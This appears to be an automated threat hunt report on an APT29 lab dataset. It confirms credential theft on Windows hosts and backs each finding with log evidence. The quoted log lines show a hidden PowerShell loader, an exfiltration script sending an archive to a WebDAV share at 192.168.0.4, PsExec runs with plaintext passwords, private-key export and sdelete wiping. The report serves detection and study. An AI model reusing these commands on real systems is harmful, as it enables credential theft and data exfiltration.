# Threat hunt report — 20261017-084133-converged-final3-playbook

**Hypothesis:** An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

**Verdict: Confirmed** — 7 in-scope incident(s) of verified malicious findings (confidence >= medium): I01 T1003.001 (F07, F21, F33, F34, F37, F48), I02 T1187 (F19), I03 T1552.001 (F29, F60), I04 T1552.001 (F59), I05 T1552.004 (F28, F57), I06 T1555.003 (F61), I08 T1557.002 (F44, F47)

Verdict method: rules over verified evidence (Confirmed if >=1 in-scope incident of verified malicious findings (confidence >= medium); Inconclusive if only suspicious incidents or coverage gaps; Refuted if full coverage and no malicious/suspicious finding)

| Run | Value |
|---|---|
| Profile | converged (thinking=False, temperature=0.0) |
| Model | deepseek-flash |
| Started / finished (UTC) | 2026-10-17T00:41:33+00:00 / 2026-10-17T00:49:37+00:00 (483.6 s) |
| LLM calls / tokens | 127 / {'prompt': 3284224, 'completion': 81996} |
| MCP tool calls | 1162 (server tools: list_data_sources, get_fields, search, count, aggregate, timeline, esql, get_event, get_registry) |
| ATT&CK tactics | credential-access — An adversary with existing access to Windows hosts on this network is stealing credentials from those hosts. |

## Data examined

| Dataset | Events | First event (UTC) | Last event (UTC) | Hosts / observers | Sources (channel → template) |
|---|---|---|---|---|---|
| windows.other | 216 | 2020-05-02 02:56:47.000Z | 2020-05-02 03:23:08.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-windows-other (push → windows-other) |
| windows.powershell | 10979 | 2020-05-02 02:56:14.000Z | 2020-05-02 03:21:30.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local | apt29-powershell (stream → windows-powershell) |
| windows.security | 41002 | 2020-05-02 02:55:25.000Z | 2020-05-02 03:28:09.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-security (push → windows-security) |
| windows.sysmon | 143884 | 2020-05-02 02:55:23.551Z | 2020-05-02 03:28:17.683Z | scranton.dmevals.local, nashua.dmevals.local, newyork.dmevals.local, utica.dmevals.local | apt29-sysmon (pull → windows-sysmon) |
| zeek | 2140 | 2020-04-30 00:06:38.899Z | 2020-04-30 00:45:00.760Z | bobs.bigwheel.local, simplerockbuild.simplerock.lan | zeek-nashua (pull → zeek); zeek-scranton (pull → zeek) |

> Time windows: windows.other [2020-05-02T02:56:47.000Z .. 2020-05-02T03:23:08.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.powershell [2020-05-02T02:56:14.000Z .. 2020-05-02T03:21:30.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.security [2020-05-02T02:55:25.000Z .. 2020-05-02T03:28:09.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.sysmon [2020-05-02T02:55:23.551Z .. 2020-05-02T03:28:17.683Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

The whole stored time range of every dataset was searched (planned checks carry no time filter).

## Incidents

Verified malicious/suspicious findings grouped by attacker action, each with the single best-fitting technique (consolidation step). In-scope incidents decide the verdict.

| Incident | Technique | In scope | Assessment | Findings | Title |
|---|---|---|---|---|---|
| I01 | T1003.001 | yes | malicious/high | F07, F21, F33, F34, F37, F48 | PowerShell opens LSASS with full-access rights on scranton (credential dumping access) |
| I02 | T1187 | yes | malicious/high | F19 | WebDAV forced authentication via davclnt DavSetCookie to 192.168.0.4 |
| I03 | T1552.001 | yes | malicious/medium | F29, F60 | accesschk.exe creates 'passwordsDB' file on scranton |
| I04 | T1552.001 | yes | malicious/high | F59 | PsExec64 launched on NASHUA with hardcoded plaintext credentials |
| I05 | T1552.004 | yes | malicious/high | F28, F57 | PowerShell Get-PrivateKeys exports LocalMachine certificates with private keys to .pfx |
| I06 | T1555.003 | yes | malicious/medium | F61 | PowerShell exports private-key .pfx to Downloads on scranton |
| I07 | T1557.001 | yes | suspicious/medium | F45 | SMB/WinRM/RPC traffic from spoofed 10.0.1.4 to NASHUA with Kerberos cifs/NASHUA tickets |
| I08 | T1557.002 | yes | malicious/high | F44, F47 | ARP cache poisoning / AiTM positioning on 10.0.1.0/24 |
| I09 | out-of-scope:T1021 | no | suspicious/medium | F20 | Outbound SMB/WebDAV probing to 192.168.0.4 and SMB to 10.0.1.6 from scranton |
| I10 | out-of-scope:T1027.004 | no | suspicious/medium | F64 | PowerShell compiles in-memory C# credential tooling via csc.exe on scranton |
| I11 | out-of-scope:T1041 | no | malicious/high | F09 | Invoke-Exfil script with hardcoded credentials and WebDAV exfiltration |
| I12 | out-of-scope:T1059.001 | no | malicious/high | F08 | Steganographic PowerShell loader (monkey.png) executed hidden with execution-policy bypass |
| I13 | out-of-scope:T1074.001 | no | malicious/high | F62 | Password-protected RAR archive created then wiped with sdelete on NASHUA |
| I14 | out-of-scope:T1204.002 | no | malicious/medium | F65 | Suspicious .scr payload in C:\ProgramData\victim launched by explorer on scranton |
| I15 | out-of-scope:T1548.002 | no | suspicious/low | F66 | hostui.exe spawned by PowerShell on scranton |
| I16 | out-of-scope:T1548.002 | no | suspicious/low | F67 | sdclt.exe spawned by cmd on scranton |
| I17 | out-of-scope:T1569.002 | no | malicious/high | F63 | python.exe executed on NASHUA via PsExec service under pbeesly |

## Findings

### F08 · malicious / high · T1056 · Steganographic PowerShell payload (monkey.png) executed with hidden window and bypass

Evidence status: **verified**

On scranton.dmevals.local, control.exe spawned PowerShell (PID 2976) with '-noni -noexit -ep bypass -window hidden' that decodes a payload from C:\Users\pbeesly\Downloads\monkey.png via System.Drawing pixel extraction and executes it with IEX. This hidden, execution-policy-bypassing loader is the process that subsequently accessed LSASS with full access, consistent with an input/credential capture toolchain.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-ae6815e51f | ok |
| 2 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\control.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-ae6815e51f | ok |
| 3 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | user.name | pbeesly | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-ae6815e51f | ok |

### F09 · malicious / high · T1056 · Invoke-Exfil PowerShell script with hardcoded credentials and WebDAV exfiltration

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly executed a PowerShell script block defining Invoke-Exfil, which compresses the user's Downloads folder with a password, builds a PSCredential from hardcoded plaintext credentials (cozy / MyCozyPassw0rd!), maps a WebDAV share to \\192.168.0.4\webdav and copies the archive there. This is credential-handling and exfiltration activity by the same user whose PowerShell accessed LSASS.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-d85af01ac4 | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-d85af01ac4 | ok |
| 3 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-d85af01ac4 | ok |
| 4 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | host.name | scranton.dmevals.local | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-d85af01ac4 | ok |

### F07 · malicious / high · T1056.004 · PowerShell process opened LSASS with full access rights (credential API access)

Evidence status: **verified**

On scranton.dmevals.local, a PowerShell process (PID 2976, launched by control.exe with a steganographic monkey.png payload) opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff at 2020-05-02T03:05:16Z. These masks include PROCESS_VM_READ and PROCESS_ALL_ACCESS, the access pattern used to read LSASS memory for credential extraction (API access to credential material). The same process ran the Invoke-Exfil script, indicating an active credential-access/exfiltration toolchain.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-5ab3fda0be | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-5ab3fda0be | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-5ab3fda0be | ok |
| 4 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-5ab3fda0be | ok |
| 5 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | host.name | scranton.dmevals.local | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-5ab3fda0be | ok |

### F19 · malicious / high · T1187 · WebDAV forced authentication via davclnt DavSetCookie on scranton.dmevals.local

Evidence status: **verified**

On host scranton.dmevals.local, user pbeesly, the WebClient service (svchost.exe -k LocalService -p -s WebClient) spawned rundll32.exe executing 'C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' five times between 03:08:50 and 03:10:23 UTC on 2020-05-02. This is the canonical T1187 forced-authentication mechanism: the WebClient/WebDAV redirector is pointed at an attacker-controlled host (192.168.0.4) so the victim's machine authenticates to it, leaking NTLM credentials. The matching network side (Zeek, 2020-04-30 window) shows the same host 10.0.1.4 issuing WebDAV OPTIONS/PROPFIND requests to 192.168.0.4 with user agents 'Microsoft-WebDAV-MiniRedir/10.0.18362' and 'DavClnt', including PROPFIND for /webdav/OfficeSupplies.7z and /webdav/python.exe, with repeated 401 Unauthorized responses (the server challenging for credentials). This activity occurs in the context of a broader compromise of scranton (malicious C:\ProgramData\victim\cod.3aka3.scr launched by explorer.exe, PowerShell stager, sdelete64 anti-forensics), consistent with an adversary harvesting credentials.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-bbb7d4c417 | ok |
| 2 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.parent.command_line | C:\windows\system32\svchost.exe -k LocalService -p -s WebClient | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-bbb7d4c417 | ok |
| 3 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | user.name | pbeesly | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-bbb7d4c417 | ok |
| 4 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | host.name | scranton.dmevals.local | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-bbb7d4c417 | ok |
| 5 | 2020-04-30 00:32:21.895Z | simplerockbuild.simplerock.lan | zeek | user_agent.original | Microsoft-WebDAV-MiniRedir/10.0.18362 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgN | q-c9efa998d6 | ok |
| 6 | 2020-04-30 00:32:21.895Z | simplerockbuild.simplerock.lan | zeek | url.original | /webdav/OfficeSupplies.7z | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgN | q-c9efa998d6 | ok |
| 7 | 2020-04-30 00:32:21.895Z | simplerockbuild.simplerock.lan | zeek | http.response.status_code | 401 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgN | q-c9efa998d6 | ok |
| 8 | 2020-04-30 00:35:25.615Z | simplerockbuild.simplerock.lan | zeek | url.original | /webdav/python.exe | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjx | q-fab0807247 | ok |
| 9 | 2020-04-30 00:32:18.095Z | simplerockbuild.simplerock.lan | zeek | user_agent.original | DavClnt | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYjF | q-742d9e9d44 | ok |
| 10 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_psP | q-5186bede9a | ok |

### F21 · malicious / high · T1212 · LSASS memory accessed with full-access rights by PowerShell and WinRM host processes

Evidence status: **verified**

On scranton.dmevals.local a PowerShell.exe process (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) and 0x1F3FFF at 2020-05-02T03:05:16Z, with a call trace through ntdll/KERNELBASE and an UNKNOWN module — the classic signature of in-memory credential dumping (e.g. Mimikatz-style LSASS read). On nashua.dmevals.local a wsmprovhost.exe process (PID 7720, the WinRM remote-PowerShell host) opened lsass.exe (PID 728) with GrantedAccess 0x1F3FFF at 2020-05-02T03:09:29Z, its call trace running through .NET/PowerShell native images (System.ni.dll, Microsoft.PowerShell.Commands.Management.ni.dll), i.e. credential access driven from a remote PowerShell session. Both events run as NT AUTHORITY\SYSTEM. These are the only non-system processes in the dataset touching lsass with such broad access masks; the remaining 289 lsass accesses are from svchost.exe with 0x1000 (query-limited) and are benign.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-21b76e0958 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-21b76e0958 | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-21b76e0958 | ok |
| 4 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-9245b94e56 | ok |
| 5 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-085a014f29 | ok |
| 6 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-085a014f29 | ok |
| 7 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\windows\assembly\NativeImages_v4.0.30319_64\System\9803982d7bc887e2745bff18a43… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-085a014f29 | ok |

### F59 · malicious / high · T1552.001 · PsExec64 launched on NASHUA with hardcoded plaintext credentials for dmevals\pbeesly

Evidence status: **verified**

On scranton.dmevals.local, PowerShell (user pbeesly) repeatedly launched C:\Program Files\SysinternalsSuite\PsExec64.exe with the cleartext credential pair -u dmevals\pbeesly -p Fl0nk3rt0n!T0by to remotely execute C:\Windows\Temp\python.exe on \\NASHUA (4 starts between 03:11 and 03:14). This is credential material embedded in a command line, consistent with unsecured-credentials usage and lateral movement using harvested credentials.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGglR | q-34dae71694 | ok |
| 2 | 2020-05-02 03:12:25.384Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUGBVXT | q-34dae71694 | ok |

### F60 · malicious / medium · T1552.001 · accesschk.exe writes a 'passwordsDB' file on scranton

Evidence status: **verified**

On scranton.dmevals.local, C:\Program Files\SysinternalsSuite\accessChk.exe (parent PowerShell, user pbeesly) wrote a file named 'passwordsDB' at 03:04:35, indicating credential material being collected into a file on disk.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbkGF | q-2cae68b3ac | ok |

### F62 · malicious / high · T1552.001 · Password-protected RAR archive of 'working.zip' created then wiped with sdelete on NASHUA

Evidence status: **verified**

On nashua.dmevals.local, C:\Windows\Temp\Rar.exe (parent powershell.exe, user pbeesly) created a password-protected archive with the hardcoded password fGzq5yKw: 'Rar.exe a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip' at 03:16:19. Immediately after, C:\Windows\Temp\sdelete64.exe (parent cmd.exe) securely deleted Rar.exe and both working.zip copies (03:16:52-03:17:41), indicating staging of collected data into an encrypted archive followed by anti-forensic cleanup.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.395Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTPA5kN | q-b09fc49429 | ok |
| 2 | 2020-05-02 03:16:52.456Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPO_TIA | q-b09fc49429 | ok |
| 3 | 2020-05-02 03:17:18.030Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPJ5Bh7 | q-b09fc49429 | ok |

### F63 · malicious / high · T1552.001 · python.exe executed on NASHUA via PsExec service under pbeesly

Evidence status: **verified**

On nashua.dmevals.local, C:\Windows\Temp\python.exe was spawned 5 times by C:\Windows\PSEXESVC.exe (the PsExec service) under user pbeesly between 03:11:40 and 03:15:04, matching the PsExec64 remote-execution command line from scranton. A python interpreter running from C:\Windows\Temp via PsExec is consistent with attacker tooling used for credential collection on the remote host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQmt | q-6b3c44e811 | ok |
| 2 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQmt | q-6b3c44e811 | ok |

### F65 · malicious / medium · T1552.001 · Suspicious .scr payload in C:\ProgramData\victim launched by explorer on scranton

Evidence status: **verified**

On scranton.dmevals.local, a suspiciously named screen-saver binary C:\ProgramData\victim\â€®cod.3aka3.scr was launched by explorer.exe with the /S argument at 02:55:56 under user pbeesly. This is the steganographic-payload staging binary (it wrote monkey.png), consistent with attacker tooling on the host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\ProgramData\victim\â€®cod.3aka3.scr" /S | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_psP | q-9b6daedd16 | ok |
| 2 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\explorer.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_psP | q-9b6daedd16 | ok |

### F28 · malicious / high · T1552.004 · PowerShell Get-PrivateKeys exports all LocalMachine certificates to .pfx files

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly ran a PowerShell script (Path: C:\Program Files\SysinternalsSuite\readme.ps1) defining function Get-PrivateKeys. It enumerates cert:\LocalMachine recursively and calls Export-PfxCertificate for every cert with a Thumbprint, writing each to $env:USERPROFILE\Downloads\<random>.pfx protected by the hardcoded password 'saribas'. This is direct private-key/certificate theft (T1552.004). A companion Invoke-BeachCleanup function later deletes $env:USERPROFILE\Downloads\*.pfx, and Invoke-Exfil compresses the Downloads dir into OfficeSupplies.7z and copies it to a WebDAV share at \\192.168.0.4\webdav, consistent with staging and exfiltration of the stolen keys.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-0eb3a0f74c | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-b92fa6a59a | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-b92fa6a59a | ok |
| 4 | 2020-05-02 03:08:51.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-BeachCleanup {     Write-Host "[*] Cleaning up"     Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force     Remove-Item -Path "$env:USER… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZLhp5O | q-13d1184e9e | ok |
| 5 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-17723d7b78 | ok |

### F33 · malicious / high · T1555 · Interactive PowerShell credential-dumping session by pbeesly accessing LSASS memory on scranton and nashua

Evidence status: **verified**

On 2020-05-02 the account pbeesly ran an interactive PowerShell attack session on scranton.dmevals.local (keystroke logging, screen capture, clipboard theft, Invoke-Exfil) and opened handles to lsass.exe with full-access masks. On scranton, powershell.exe requested a handle to \Device\HarddiskVolume2\Windows\System32\lsass.exe with AccessMask 0x1fffff (PROCESS_ALL_ACCESS, including 'Read from process memory'), and Sysmon recorded powershell.exe accessing lsass.exe. Using Invoke-Command -ComputerName NASHUA, the same user's remote session on nashua.dmevals.local (wsmprovhost.exe) requested lsass.exe with AccessMask 0x1f3fff. Reading LSASS memory is the standard way to harvest credentials from Windows password stores (DPAPI/Credential Manager secrets).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0x1fffff | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKB- | q-0238cf449b | ok |
| 2 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKB- | q-0238cf449b | ok |
| 3 | 2020-05-02 03:09:29.000Z | nashua.dmevals.local | windows.security | win.AccessMask | 0x1f3fff | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8FLV1 | q-73d28d049e | ok |
| 4 | 2020-05-02 03:09:29.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\wsmprovhost.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8FLV1 | q-73d28d049e | ok |
| 5 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTtmJQ5 | q-c834028b67 | ok |
| 6 | 2020-05-02 03:09:23.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName \| Select-Object UserName,SessionId \| Where-Object { $_.UserName -like "*\$env:… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZKhD3z | q-5bd49ef30b | ok |

### F61 · malicious / medium · T1555.003 · PowerShell exports a private-key .pfx to Downloads on scranton

Evidence status: **verified**

On scranton.dmevals.local, powershell.exe wrote C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx at 03:04:57, consistent with exporting a certificate with its private key (credential material) to disk.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-2cae68b3ac | ok |

### F34 · malicious / medium · T1555.004 · LSASS handle requests with full-access masks consistent with harvesting Windows Credential Manager/DPAPI secrets

Evidence status: **verified**

The same pbeesly activity that targeted LSASS used access masks (0x1fffff on scranton via powershell.exe, 0x1f3fff on nashua via wsmprovhost.exe) that include 'Read from process memory' and 'Duplicate handle into or out of process' — the rights needed to extract DPAPI master keys and Credential Manager vault secrets held in LSASS. No cmdkey/vaultcmd command lines, no Credential Manager registry/file artifacts (Sysmon 15 on *Credentials*, 4688 with vault/cmdkey) were observed, so the Credential Manager-specific store access is inferred from the LSASS memory access rather than directly logged.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
